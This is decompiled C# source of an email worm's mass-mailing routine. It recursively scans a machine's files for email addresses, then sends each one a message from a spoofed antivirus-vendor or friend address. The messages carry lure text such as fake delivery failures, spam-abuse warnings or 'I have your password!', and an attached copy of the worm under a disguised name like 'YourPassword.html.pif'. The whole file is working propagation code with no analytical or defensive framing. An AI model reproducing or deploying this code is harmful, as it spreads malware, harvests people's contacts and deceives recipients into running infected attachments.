using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Mail;

namespace sex;

internal class sex
{
	public void massmail(string td)
	{
		//IL_035c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Expected O, but got Unknown
		//IL_03d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e2: Expected O, but got Unknown
		Thread.Sleep(1000000);
		try
		{
			string[] array = new string[6] { "mail.pif", "YourPassword.html.pif", "ScreenSaver.scr", "Winamp2006.ex", "NewEmule.exe", "DotNetFrameWork.exe" };
			int num = new Random().Next(0, 6);
			string text = array[num];
			string[] array2 = new string[6] { "Delivery Failure", "Deliver Mail", "Failed", "Mail System", "Status", "Unknown Exception" };
			int num2 = new Random().Next(0, 6);
			string subject = array2[num2];
			string[] array3 = new string[13]
			{
				"Thank you for using file", "+++ Attachment: No Virus (Clean)", "It has come to our attention that your (File!) User Profile ( x )records are out of date. For further details see the attached document.Tank you for using !", "+++ report file", "Your e-mail account was used to send a huge amount of unsolicited spam messages during the recent week. If you could please take 5-10 minutes out of your online experience and confirm the attached document so you will not run into any future problems with the online service.", "Deliver Error", "Message Error", "help attached", "such as yours", "illegal st. of you?",
				"I have your password! ", "classroom test of you?", "old screen about you?"
			};
			int num3 = new Random().Next(0, 13);
			string body = array3[num3];
			string[] array4 = new string[20]
			{
				"mcafee@yahoo.com", "symantec@yahoo.com", "nod32@yahoo.com", "panda@yahoo.com", "avg@yahoo.com", "emule@yahoo.com", "info@yahoo.com", "ebook@yahoo.com", "LongShot@yahoo.com", "winamp@yahoo.com",
				"update@yahoo.com", "matt@yahoo.com", "steve@yahoo.com", "smith@yahoo.com", "stan@yahoo.com", "bill@yahoo.com", "bob@yahoo.com", "YourFriend@yahoo.com", " mail@yahoo.com", "ted@yahoo.com"
			};
			int num4 = new Random().Next(0, 20);
			string from = array4[num4];
			string[] array5 = new string[13]
			{
				"*txt", "*htm", "*xml", "*adb", "*asp", "*cfg", "*cgi", "*dbx", "*eml", "*pl",
				"*shtm", "*wab", "*vbs"
			};
			try
			{
				string[] array6 = array5;
				foreach (string searchPattern in array6)
				{
					string[] files = Directory.GetFiles(td, searchPattern);
					string[] array7 = files;
					foreach (string path in array7)
					{
						Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[com]+");
						FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
						byte[] array8 = new byte[fileStream.Length];
						fileStream.Read(array8, 0, (int)fileStream.Length);
						fileStream.Close();
						foreach (Match item in regex.Matches(Encoding.ASCII.GetString(array8)))
						{
							string text2 = item.ToString();
							try
							{
								MailMessage val = new MailMessage();
								val.set_From(from);
								val.set_To(text2);
								val.set_Cc("info@yahoo.com");
								val.set_Bcc("AV@yahoo.com");
								val.set_Subject(subject);
								val.set_Body(body);
								if (Regex.IsMatch(text2, "@yahoo.com"))
								{
									SmtpMail.set_SmtpServer("mx1.mail.yahoo.com");
								}
								if (Regex.IsMatch(text2, "@hotmail.com"))
								{
									SmtpMail.set_SmtpServer("mx1.hotmail.com");
								}
								val.get_Attachments().Add((object?)new MailAttachment(text, (MailEncoding)1));
								SmtpMail.Send(val);
							}
							catch (Exception)
							{
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(td);
			string[] array9 = directories;
			foreach (string td2 in array9)
			{
				massmail(td2);
			}
		}
		catch (Exception)
		{
		}
	}
}
